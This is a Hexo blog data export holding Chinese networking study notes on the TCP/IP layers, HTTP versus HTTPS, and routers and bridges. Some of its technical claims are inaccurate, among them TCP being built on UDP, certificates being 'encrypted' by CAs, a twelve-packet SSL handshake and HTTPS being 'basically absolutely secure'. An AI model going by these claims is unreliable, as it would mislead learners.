title=\"TCP/IP协议四层模型\"></a>TCP/IP协议四层模型</h2><p>TCP/IP协议是OSI体系结构的一种实现，但将OSI概念体系中的”会话层，表达层，应用层“合并为”应用层“，传输层和网络层基本不变，又将”数据链路层和物理层“归并成”网络接口层“，使其更简洁，便于实现。</p>\n<h3 id=\"链路层\"><a href=\"#链路层\" class=\"headerlink\" title=\"链路层\"></a>链路层</h3><p>以太网协议规定，接入网络的设备都必须安装网络适配器，即网卡，数据包必须是从一块网卡传送到另一块网卡。而网卡地址就是数据包的发送地址和接收地址，有了MAC地址以后，<a href=\"https://baike.baidu.com/item/以太网/99684\" target=\"_blank\" rel=\"noopener\">以太网</a>采用广播形式，把数据包发给该子网内所有主机，子网内每台主机在接收到这个包以后，都会读取首部里的目标MAC地址，然后和自己的MAC地址进行对比，如果相同就做下一步处理，如果不同，就丢弃这个包。 [4] </p>\n<p>所以链路层的主要工作就是对电信号进行分组并形成具有特定意义的数据帧，然后以广播的形式通过物理介质发送给接收方。 [4] </p>\n<h3 id=\"网络层\"><a href=\"#网络层\" class=\"headerlink\" title=\"网络层\"></a>网络层</h3><p><strong>IP协议</strong></p>\n<p>网络层引入了IP协议，制定了一套新地址，使得我们能够区分两台主机是否同属一个网络，这套地址就是网络地址，也就是所谓的IP地址。IP协议将这个32位的地址分为两部分，前面部分代表网络地址，后面部分表示该主机在局域网中的地址。如果两个IP地址在同一个子网内，则网络地址一定相同。为了判断IP地址中的网络地址，IP协议还引入了子网掩码，IP地址和子网掩码通过按位与运算后就可以得到网络地址。 [4] </p>\n<p><strong>ARP协议</strong></p>\n<p>即地址解析协议，是根据IP地址获取MAC地址的一个网络层协议。其工作原理如下：ARP首先会发起一个请求数据包，数据包的首部包含了目标主机的IP地址，然后这个数据包会在链路层进行再次包装，生成以太网数据包，最终由以太网广播给子网内的所有主机，每一台主机都会接收到这个数据包，并取出标头里的IP地址，然后和自己的IP地址进行比较，如果相同就返回自己的MAC地址，如果不同就丢弃该数据包。ARP接收返回消息，以此确定目标机的MAC地址；与此同时，ARP还会将返回的MAC地址与对应的IP地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。 [4] </p>\n<p><strong>路由协议</strong></p>\n<p>首先通过IP协议来判断两台主机是否在同一个<a href=\"https://baike.baidu.com/item/子网/1186929\" target=\"_blank\" rel=\"noopener\">子网</a>中，如果在同一个子网，就通过ARP协议查询对应的MAC地址，然后以广播的形式向该子网内的主机发送数据包；如果不在同一个子网，以太网会将该数据包转发给本子网的网关进行路由。<a href=\"https://baike.baidu.com/item/网关/98992\" target=\"_blank\" rel=\"noopener\">网关</a>是<a href=\"https://baike.baidu.com/item/互联网/199186\" target=\"_blank\" rel=\"noopener\">互联网</a>上子网与子网之间的桥梁，所以网关会进行多次转发，最终将该数据包转发到目标IP所在的子网中，然后再通过ARP获取目标机MAC，最终也是通过广播形式将数据包发送给接收方。而完成这个路由协议的物理设备就是<a href=\"https://baike.baidu.com/item/路由器/108294\" target=\"_blank\" rel=\"noopener\">路由器</a>，路由器扮演着交通枢纽的角色，它会根据信道情况，选择并设定路由，以最佳路径来转发数据包。 [4] </p>\n<p>所以，网络层的主要工作是定义网络地址、区分网段、子网内MAC寻址、对于不同子网的数据包进行路由。 [4] </p>\n<h3 id=\"传输层\"><a href=\"#传输层\" class=\"headerlink\" title=\"传输层\"></a>传输层</h3><p>链路层定义了主机的身份，即MAC地址，而网络层定义了IP地址，明确了主机所在的<a href=\"https://baike.baidu.com/item/网段/11026985\" target=\"_blank\" rel=\"noopener\">网段</a>，有了这两个地址，数据包就从可以从一个主机发送到另一台主机。但实际上数据包是从一个主机的某个应用程序发出，然后由对方主机的应用程序接收。而每台电脑都有可能同时运行着很多个应用程序，所以当数据包被发送到主机上以后，是无法确定哪个应用程序要接收这个包。因此传输层引入了<a href=\"https://baike.baidu.com/item/UDP/571511\" target=\"_blank\" rel=\"noopener\">UDP</a>协议来解决这个问题，为了给每个应用程序标识身份。</p>\n<p>传输层协议负责解决数据传输问题，包括数据通行的可靠性问题。传输层依赖更底层的网络层来完成实际的数据传输，在TCP/IP网络协议中，负责可靠通信的传输层协议为TCP协议。<strong>而网络层一般用网络驱动来实现，普通的程序员不会涉及</strong>；在TCP/IP协议中，网络层的协议为IP协议。</p>\n<p><strong>UDP协议</strong></p>\n<p>UDP协议定义了端口，同一个主机上的每个应用程序都需要指定唯一的端口号，并且规定网络中传输的数据包必须加上端口信息，当数据包到达主机以后，就可以根据端口号找到对应的应用程序了。UDP协议比较简单，实现容易，但它没有确认机制，数据包一旦发出，无法知道对方是否收到，因此可靠性较差，为了解决这个问题，提高网络可靠性，TCP协议就诞生了。</p>\n<p><strong>TCP协议</strong></p>\n<p>TCP即传输控制协议，是一种面向连接的、可靠的、基于字节流的通信协议。简单来说TCP就是有确认机制的UDP协议，每发出一个数据包都要求确认，如果有一个数据包丢失，就收不到确认，发送方就必须重发这个数据包。为了保证传输的可靠性，TCP协议在UDP基础之上建立了三次对话的确认机制，即在正式收发数据前，必须和对方建立可靠的连接。TCP数据包和UDP一样，都是由首部和数据两部分组成，唯一不同的是，TCP数据包没有长度限制，理论上可以无限长，但是为了保证网络的效率，通常TCP数据包的长度不会超过IP数据包的长度，以确保单个TCP数据包不必再分割。 [4] </p>\n<p>传输层的主要工作是定义<a href=\"https://baike.baidu.com/item/端口/103505\" target=\"_blank\" rel=\"noopener\">端口</a>，标识应用程序身份，实现端口到端口的通信，TCP协议可以保证数据传输的可靠性。 [4] </p>\n<h3 id=\"应用层\"><a href=\"#应用层\" class=\"headerlink\" title=\"应用层\"></a>应用层</h3><p>理论上讲，有了以上三层协议的支持，数据已经可以从一个主机上的应用程序传输到另一台主机的应用程序了，但此时传过来的数据是字节流，不能很好的被程序识别，操作性差，因此，应用层定义了各种各样的协议来规范数据格式，常见的有<a href=\"https://baike.baidu.com/item/http/243074\" target=\"_blank\" rel=\"noopener\">http</a>,ftp,<a href=\"https://baike.baidu.com/item/smtp/175887\" target=\"_blank\" rel=\"noopener\">smtp</a>等，在请求<a href=\"https://baike.baidu.com/item/Header/688992\" target=\"_blank\" rel=\"noopener\">Header</a>中，分别定义了请求数据格式Accept和响应数据格式Content-Type，有了这个规范以后，当对方接收到请求以后就知道该用什么格式来解析，然后对请求进行处理，最后按照请求方要求的格式将数据返回，请求端接收到响应后，就按照规定的格式进行解读。 [4] </p>\n<p>所以应用层的主要工作就是定义数据格式并按照对应的格式解读数据。 [4] </p>\n"},{"layout":"post","title":"HTTP和HTTPs知识点的个人总结","date":"2020-11-21T16:00:00.000Z","description":"笔记","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n# HTTP和HTTPs知识点的个人总结\n\n**HTTP**: 超文本传输协议\n\n一种普遍建立在TCP协议基础上的互联网传输协议，用来规范浏览器和服务器之间的通信和数据传输，也就是**专门用来传输HTML页面的**。\n\n是一种**应用层**的协议，比传输层的TCP协议更高一层。它们之间没有必然的依赖关系。\n\n通俗地说，HTTP负责这个数据包的内容格式，它不管你的传输是否正确，是否成功，是否安全，它只管把HTML的页面以这种协议规范格式组合好。\n\n而TCP不管你发的数据包内容是什么，它只管按照TCP协议的规范和流程将这个数据包发送到指定的对象手上。\n\n浏览器与网站服务器的沟通过程是这样的：\n\n1.TCP三次握手，确立信息传输通道\n\n2.传输http数据包\n\n3.TCP四次挥手\n\n4.连接断开，传输通道关闭\n\n所以，HTTP并不一定要依赖TCP,只要能进行数据传输，就能使用HTTP协议。\n\n\n\n**HTTPs**：安全的HTTP（使用ssl/tls加密通信的HTTP）\n\n**证书**：由合法、公认的CA机构用不对称加密算法（RSA）加密的**网站的公钥以及一些信息（包括网站信息以及证书信息）**。浏览器内置这些合法CA机构的公钥，所以能解密这个证书中的信息，从而验证这个证书的合法性以及得到网站的公钥。\n\n实际上并不是只有CA机构能颁发证书，个人或私有组织、软件也能颁发证书，但浏览器收到个人或私有组织、软件颁发的证书会发出警告，用户可以选择是否相信这个组织或证书，这也是为什么使用burpsuite抓HTTPs的数据包需要安装bp的证书。\n\n得到网站公钥不是直接用来传输数据的，而是用来加密接下来与服务器“商量”ssl加密通道的的消息的。\n\n![https传输图解](/img/https-intro.png)\n\n因为显然网站的公钥很容易获取，任何人只要拥有CA的公钥并向网站发起一次ssl连接请求，就能够得到网站的公钥，所以公钥不能直接用来加密客户端与服务器之间的“通话”，这样并没有安全可言。\n\n但如上图所示，浏览器用公钥加密一个随机KEY，并发给服务器作为一个足够复杂的对称加密算法的KEY(密钥)，来进行接下来的数据传输，这种方式无疑安全的多，只要这种对称加密算法足够复杂。\n\n因为这个随机KEY只有用私钥解密才能获得，没有私钥，截获了也没有用，所以第三方对此基本束手无策。\n\n故，HTTPs是一种“基本绝对安全”的通信方式。\n\n\n\n另，HTTPs连接一般比HTTP慢的多，因为，HTTP只需要TCP三次握手，发送三个数据包，HTTPs除了TCP三次握手，还有ssl九次握手（以后再详写），加起来一共十二个数据包。","source":"_posts/2020-11-22-HTTP和HTTPs知识点的个人总结.md","raw":"---\nlayout: post\ntitle: HTTP和HTTPs知识点的个人总结\ndate: 2020-11-22\ncategories: blog\ntags: [web,计算机网络]\ndescription: 笔记\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n# HTTP和HTTPs知识点的个人总结\n\n**HTTP**: 超文本传输协议\n\n一种普遍建立在TCP协议基础上的互联网传输协议，用来规范浏览器和服务器之间的通信和数据传输，也就是**专门用来传输HTML页面的**。\n\n是一种**应用层**的协议，比传输层的TCP协议更高一层。它们之间没有必然的依赖关系。\n\n通俗地说，HTTP负责这个数据包的内容格式，它不管你的传输是否正确，是否成功，是否安全，它只管把HTML的页面以这种协议规范格式组合好。\n\n而TCP不管你发的数据包内容是什么，它只管按照TCP协议的规范和流程将这个数据包发送到指定的对象手上。\n\n浏览器与网站服务器的沟通过程是这样的：\n\n1.TCP三次握手，确立信息传输通道\n\n2.传输http数据包\n\n3.TCP四次挥手\n\n4.连接断开，传输通道关闭\n\n所以，HTTP并不一定要依赖TCP,只要能进行数据传输，就能使用HTTP协议。\n\n\n\n**HTTPs**：安全的HTTP（使用ssl/tls加密通信的HTTP）\n\n**证书**：由合法、公认的CA机构用不对称加密算法（RSA）加密的**网站的公钥以及一些信息（包括网站信息以及证书信息）**。浏览器内置这些合法CA机构的公钥，所以能解密这个证书中的信息，从而验证这个证书的合法性以及得到网站的公钥。\n\n实际上并不是只有CA机构能颁发证书，个人或私有组织、软件也能颁发证书，但浏览器收到个人或私有组织、软件颁发的证书会发出警告，用户可以选择是否相信这个组织或证书，这也是为什么使用burpsuite抓HTTPs的数据包需要安装bp的证书。\n\n得到网站公钥不是直接用来传输数据的，而是用来加密接下来与服务器“商量”ssl加密通道的的消息的。\n\n![https传输图解](/img/https-intro.png)\n\n因为显然网站的公钥很容易获取，任何人只要拥有CA的公钥并向网站发起一次ssl连接请求，就能够得到网站的公钥，所以公钥不能直接用来加密客户端与服务器之间的“通话”，这样并没有安全可言。\n\n但如上图所示，浏览器用公钥加密一个随机KEY，并发给服务器作为一个足够复杂的对称加密算法的KEY(密钥)，来进行接下来的数据传输，这种方式无疑安全的多，只要这种对称加密算法足够复杂。\n\n因为这个随机KEY只有用私钥解密才能获得，没有私钥，截获了也没有用，所以第三方对此基本束手无策。\n\n故，HTTPs是一种“基本绝对安全”的通信方式。\n\n\n\n另，HTTPs连接一般比HTTP慢的多，因为，HTTP只需要TCP三次握手，发送三个数据包，HTTPs除了TCP三次握手，还有ssl九次握手（以后再详写），加起来一共十二个数据包。","slug":"2020-11-22-HTTP和HTTPs知识点的个人总结","published":1,"updated":"2020-11-22T04:29:47.766Z","comments":1,"photos":[],"link":"","_id":"ckkntx9k2001ixov7cc24fj4c","content":"<h1 id=\"HTTP和HTTPs知识点的个人总结\"><a href=\"#HTTP和HTTPs知识点的个人总结\" class=\"headerlink\" title=\"HTTP和HTTPs知识点的个人总结\"></a>HTTP和HTTPs知识点的个人总结</h1><p><strong>HTTP</strong>: 超文本传输协议</p>\n<p>一种普遍建立在TCP协议基础上的互联网传输协议，用来规范浏览器和服务器之间的通信和数据传输，也就是<strong>专门用来传输HTML页面的</strong>。</p>\n<p>是一种<strong>应用层</strong>的协议，比传输层的TCP协议更高一层。它们之间没有必然的依赖关系。</p>\n<p>通俗地说，HTTP负责这个数据包的内容格式，它不管你的传输是否正确，是否成功，是否安全，它只管把HTML的页面以这种协议规范格式组合好。</p>\n<p>而TCP不管你发的数据包内容是什么，它只管按照TCP协议的规范和流程将这个数据包发送到指定的对象手上。</p>\n<p>浏览器与网站服务器的沟通过程是这样的：</p>\n<p>1.TCP三次握手，确立信息传输通道</p>\n<p>2.传输http数据包</p>\n<p>3.TCP四次挥手</p>\n<p>4.连接断开，传输通道关闭</p>\n<p>所以，HTTP并不一定要依赖TCP,只要能进行数据传输，就能使用HTTP协议。</p>\n<p><strong>HTTPs</strong>：安全的HTTP（使用ssl/tls加密通信的HTTP）</p>\n<p><strong>证书</strong>：由合法、公认的CA机构用不对称加密算法（RSA）加密的<strong>网站的公钥以及一些信息（包括网站信息以及证书信息）</strong>。浏览器内置这些合法CA机构的公钥，所以能解密这个证书中的信息，从而验证这个证书的合法性以及得到网站的公钥。</p>\n<p>实际上并不是只有CA机构能颁发证书，个人或私有组织、软件也能颁发证书，但浏览器收到个人或私有组织、软件颁发的证书会发出警告，用户可以选择是否相信这个组织或证书，这也是为什么使用burpsuite抓HTTPs的数据包需要安装bp的证书。</p>\n<p>得到网站公钥不是直接用来传输数据的，而是用来加密接下来与服务器“商量”ssl加密通道的的消息的。</p>\n<p><img src=\"/img/https-intro.png\" alt=\"https传输图解\"></p>\n<p>因为显然网站的公钥很容易获取，任何人只要拥有CA的公钥并向网站发起一次ssl连接请求，就能够得到网站的公钥，所以公钥不能直接用来加密客户端与服务器之间的“通话”，这样并没有安全可言。</p>\n<p>但如上图所示，浏览器用公钥加密一个随机KEY，并发给服务器作为一个足够复杂的对称加密算法的KEY(密钥)，来进行接下来的数据传输，这种方式无疑安全的多，只要这种对称加密算法足够复杂。</p>\n<p>因为这个随机KEY只有用私钥解密才能获得，没有私钥，截获了也没有用，所以第三方对此基本束手无策。</p>\n<p>故，HTTPs是一种“基本绝对安全”的通信方式。</p>\n<p>另，HTTPs连接一般比HTTP慢的多，因为，HTTP只需要TCP三次握手，发送三个数据包，HTTPs除了TCP三次握手，还有ssl九次握手（以后再详写），加起来一共十二个数据包。</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"HTTP和HTTPs知识点的个人总结\"><a href=\"#HTTP和HTTPs知识点的个人总结\" class=\"headerlink\" title=\"HTTP和HTTPs知识点的个人总结\"></a>HTTP和HTTPs知识点的个人总结</h1><p><strong>HTTP</strong>: 超文本传输协议</p>\n<p>一种普遍建立在TCP协议基础上的互联网传输协议，用来规范浏览器和服务器之间的通信和数据传输，也就是<strong>专门用来传输HTML页面的</strong>。</p>\n<p>是一种<strong>应用层</strong>的协议，比传输层的TCP协议更高一层。它们之间没有必然的依赖关系。</p>\n<p>通俗地说，HTTP负责这个数据包的内容格式，它不管你的传输是否正确，是否成功，是否安全，它只管把HTML的页面以这种协议规范格式组合好。</p>\n<p>而TCP不管你发的数据包内容是什么，它只管按照TCP协议的规范和流程将这个数据包发送到指定的对象手上。</p>\n<p>浏览器与网站服务器的沟通过程是这样的：</p>\n<p>1.TCP三次握手，确立信息传输通道</p>\n<p>2.传输http数据包</p>\n<p>3.TCP四次挥手</p>\n<p>4.连接断开，传输通道关闭</p>\n<p>所以，HTTP并不一定要依赖TCP,只要能进行数据传输，就能使用HTTP协议。</p>\n<p><strong>HTTPs</strong>：安全的HTTP（使用ssl/tls加密通信的HTTP）</p>\n<p><strong>证书</strong>：由合法、公认的CA机构用不对称加密算法（RSA）加密的<strong>网站的公钥以及一些信息（包括网站信息以及证书信息）</strong>。浏览器内置这些合法CA机构的公钥，所以能解密这个证书中的信息，从而验证这个证书的合法性以及得到网站的公钥。</p>\n<p>实际上并不是只有CA机构能颁发证书，个人或私有组织、软件也能颁发证书，但浏览器收到个人或私有组织、软件颁发的证书会发出警告，用户可以选择是否相信这个组织或证书，这也是为什么使用burpsuite抓HTTPs的数据包需要安装bp的证书。</p>\n<p>得到网站公钥不是直接用来传输数据的，而是用来加密接下来与服务器“商量”ssl加密通道的的消息的。</p>\n<p><img src=\"/img/https-intro.png\" alt=\"https传输图解\"></p>\n<p>因为显然网站的公钥很容易获取，任何人只要拥有CA的公钥并向网站发起一次ssl连接请求，就能够得到网站的公钥，所以公钥不能直接用来加密客户端与服务器之间的“通话”，这样并没有安全可言。</p>\n<p>但如上图所示，浏览器用公钥加密一个随机KEY，并发给服务器作为一个足够复杂的对称加密算法的KEY(密钥)，来进行接下来的数据传输，这种方式无疑安全的多，只要这种对称加密算法足够复杂。</p>\n<p>因为这个随机KEY只有用私钥解密才能获得，没有私钥，截获了也没有用，所以第三方对此基本束手无策。</p>\n<p>故，HTTPs是一种“基本绝对安全”的通信方式。</p>\n<p>另，HTTPs连接一般比HTTP慢的多，因为，HTTP只需要TCP三次握手，发送三个数据包，HTTPs除了TCP三次握手，还有ssl九次握手（以后再详写），加起来一共十二个数据包。</p>\n"},{"layout":"post","title":"路由器和桥接器","date":"2020-11-20T16:00:00.000Z","description":"关于路由器和桥接器的一些知识笔记","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n# 路由器\n\n路由器在网络层。\n\n\n\n路由器中的储存器里有一张路由表，里面存储着很多节点之间的最佳路由方案。但网络环境很复杂，有时还是需要动态路由。\n\n# 桥接器\n\n桥接器在在数据链路层。\n\n\n\n交换机就是多端口桥接器。\n\n桥接器在功能上与[集线器](https://zh.wikipedia.org/wiki/集线器)等其他用于连接网段的设备类似，不过后者工作在[物理层](https://zh.wikipedia.org/wiki/物理层)（OSI模型第1层）。\n\n- 网桥能够识别数据链路层中的数据帧，并将这些数据帧临时存储于内存，再重新生成信号作为一个全新的数据帧转发给相连的另一个网段（network segment）。由于能够对数据帧拆包、暂存、重新打包（称为存储转发机制 store-and-forward），网桥能够连接不同技术参数传输速率的数据链路，如连接10BASE-T与100BASE-TX。\n- 数据帧中有一个位叫做FCS，用来通过[CRC](https://zh.wikipedia.org/wiki/CRC32)方式校验数据帧中的位。网桥可以检查FCS，将那些损坏的数据帧丢弃。\n- 网桥在向其他网段转发数据帧时会做冲突检测控制。\n- 网桥还能通过地址自学机制和过滤功能控制网络流量，具有OSI第2层[网络交换机](https://zh.wikipedia.org/wiki/网络交换机)功能。这称为transparent bridge，由[DEC](https://zh.wikipedia.org/wiki/DEC)在1980年代发明[[4\\]](https://zh.wikipedia.org/wiki/橋接器#cite_note-4)。其机制是网桥内部有一个数据库，最初没有数据。当网桥从一个网段收到一个数据帧，就会在数据库中登记（或者更新）数据帧的源地址属于这个网段，并检查数据包的目的地址。如果目的地址在数据库中属于另外一个网段，则网桥向该网段转发该数据帧；如果目的地址在数据库中没有记录，则网桥向除了源地址所在之外的其他所有网段转发（flood）该数据帧。\n- 桥接器仅仅在不同网络之间有数据传输的时候才将数据转发到其他网络，不是像集线器那样对所有数据都进行广播。对于[以太网](https://zh.wikipedia.org/wiki/以太网)，“桥接”这一术语正式的含义是指符合[IEEE 802.1D](https://zh.wikipedia.org/wiki/IEEE_802.1D)标准的设备，即“网络切换”。桥接器可以分割网段，不似集线器仍是在为同一[碰撞域](https://zh.wikipedia.org/w/index.php?title=碰撞域&action=edit&redlink=1)，所以对带宽耗损较大。因桥接器透过其内之MAC表格，让发送帧不会通过，所以其称之为数据链接层操作之网络组件，可隔离碰撞。\n\n若有通信频繁的机器，则应置于同区之内，否则性能将降低。","source":"_posts/2020-11-21-路由器和桥接器.md","raw":"---\nlayout: post\ntitle: 路由器和桥接器\ndate: 2020-11-21\ncategories: blog\ntags: [web,计算机网络]\ndescription: 关于路由器和桥接器的一些知识笔记\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n# 路由器\n\n路由器在网络层。\n\n\n\n路由器中的储存器里有一张路由表，里面存储着很多节点之间的最佳路由方案。但网络环境很复杂，有时还是需要动态路由。\n\n# 桥接器\n\n桥接器在在数据链路层。\n\n\n\n交换机就是多端口桥接器。\n\n桥接器在功能上与[集线器](https://zh.wikipedia.org/wiki/集线器)等其他用于连接网段的设备类似，不过后者工作在[物理层](https://zh.wikipedia.org/wiki/物理层)（OSI模型第1层）。\n\n- 网桥能够识别数据链路层中的数据帧，并将这些数据帧临时存储于内存，再重新生成信号作为一个全新的数据帧转发给相连的另一个网段（network segment）。由于能够对数据帧拆包、暂存、重新打包（称为存储转发机制 store-and-forward），网桥能够连接不同技术参数传输速率的数据链路，如连接10BASE-T与100BASE-TX。\n- 数据帧中有一个位叫做FCS，用来通过[CRC](https://zh.wikipedia.org/wiki/CRC32)方式校验数据帧中的位。网桥可以检查FCS，将那些损坏的数据帧丢弃。\n- 网桥在向其他网段转发数据帧时会做冲突检测控制。\n- 网桥还能通过地址自学机制和过滤功能控制网络流量，具有OSI第2层[网络交换机](https://zh.wikipedia.org/wiki/网络交换机)功能。这称为transparent bridge，由[DEC](https://zh.wikipedia.org/wiki/DEC)在1980年代发明[[4\\]](https://zh.wikipedia.org/wiki/橋接器#cite_note-4)。其机制是网桥内部有一个数据库，最初没有数据。当网桥从一个网段收到一个数据帧，就会在数据库中登记（或者更新）数据帧的源地址属于这个网段，并检查数据包的目的地址。如果目的地址在数据库中属于另外一个网段，则网桥向该网段转发该数据帧；如果目的地址在数据库中没有记录，则网桥向除了源地址所在之外的其他所有网段转发（flood）该数据帧。\n- 桥接器仅仅在不同网络之间有数据传输的时候才将数据转发到其他网络，不是像集线器那样对所有数据都进行广播。对于[以太网](https://zh.wikipedia.org/wiki/以太网)，“桥接”这一术语正式的含义是指符合[IEEE 802.1D](https://zh.wikipedia.org/wiki/IEEE_802.1D)标准的设备，即“网络切换”。桥接器可以分割网段，不似集线器仍是在为同一[碰撞域](https://zh.wikipedia.org/w/index.php?title=碰撞域&action=edit&redlink=1)，所以对带宽耗损较大。因桥接器透过其内之MAC表格，让发送帧不会通过，所以其称之为数据链接层操作之网络组件，可隔离碰撞。\n\n若有通信频繁的机器，则应置于同区之内，否则性能将降低。","slug":"2020-11-21-路由器和桥接器","published":1,"updated":"2020-11-22T02:20:17.876Z","comments":1,"photos":[],"link":"","_id":"ckkntx9k3001lxov7gbu5hrmj","content":"<h1 id=\"路由器\"><a href=\"#路由器\" class=\"headerlink\" title=\"路由器\"></a>路由器</h1><p>路由器在网络层。</p>\n<p>路由器中的储存器里有一张路由表，里面存储着很多节点之间的最佳路由方案。但网络环境很复杂，有时还是需要动态路由。</p>\n<h1 id=\"桥接器\"><a href=\"#桥接器\" class=\"headerlink\" title=\"桥接器\"></a>桥接器</h1><p>桥接器在在数据链路层。</p>\n<p>交换机就是多端口桥接器。</p>\n<p>桥接器在功能上与<a href=\"https://zh.wikipedia.org/wiki/集线器\" target=\"_blank\" rel=\"noopener\">集线器</a>等其他用于连接网段的设备类似，不过后者工作在<a href=\"https://zh.wikipedia.org/wiki/物理层\" target=\"_blank\" rel=\"noopener\">物理层</a>（OSI模型第1层）。</p>\n<ul>\n<li>网桥能够识别数据链路层中的数据帧，并将这些数据帧临时存储于内存，再重新生成信号作为一个全新的数据帧转发给相连的另一个网段（network segment）。由于能够对数据帧拆包、暂存、重新打包（称为存储转发机制 store-and-forward），网桥能够连接不同技术参数传输速率的数据链路，如连接10BASE-T与100BASE-TX。</li>\n<li>数据帧中有一个位叫做FCS，用来通过<a href=\"https://zh.wikipedia.org/wiki/CRC32\" target=\"_blank\" rel=\"noopener\">CRC</a>方式校验数据帧中的位。网桥可以检查FCS，将那些损坏的数据帧丢弃。</li>\n<li>网桥在向其他网段转发数据帧时会做冲突检测控制。</li>\n<li>网桥还能通过地址自学机制和过滤功能控制网络流量，具有OSI第2层<a href=\"https://zh.wikipedia.org/wiki/网络交换机\" target=\"_blank\" rel=\"noopener\">网络交换机</a>功能。这称为transparent bridge，由<a href=\"https://zh.wikipedia.org/wiki/DEC\" target=\"_blank\" rel=\"noopener\">DEC</a>在1980年代发明<a href=\"https://zh.wikipedia.org/wiki/橋接器#cite_note-4\" target=\"_blank\" rel=\"noopener\">[4]</a>。其机制是网桥内部有一个数据库，最初没有数据。当网桥从一个网段收到一个数据帧，就会在数据库中登记（或者更新）数据帧的源地址属于这个网段，并检查数据包的目的地址。如果目的地址在数据库中属于另外一个网段，则网桥向该网段转发该数据帧；如果目的地址在数据库中没有记录，则网桥向除了源地址所在之外的其他所有网段转发（flood）该数据帧。</li>\n<li>桥接器仅仅在不同网络之间有数据传输的时候才将数据转发到其他网络，不是像集线器那样对所有数据都进行广播。对于<a href=\"https://zh.wikipedia.org/wiki/以太网\" target=\"_blank\" rel=\"noopener\">以太网</a>，“桥接”这一术语正式的含义是指符合<a href=\"https://zh.wikipedia.org/wiki/IEEE_802.1D\" target=\"_blank\" rel=\"noopener\">IEEE 802.1D</a>标准的设备，即“网络切换”。桥接器可以分割网段，不似集线器仍是在为同一<a href=\"https://zh.wikipedia.org/w/index.php?title=碰撞域&amp;action=edit&amp;redlink=1\" target=\"_blank\" rel=\"noopener\">碰撞域</a>，所以对带宽耗损较大。因桥接器透过其内之MAC表格，让发送帧不会通过，所以其称之为数据链接层操作之网络组件，可隔离碰撞。</li>\n</ul>\n<p>若有通信频繁的机器，则应置于同区之内，否则性能将降低。</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      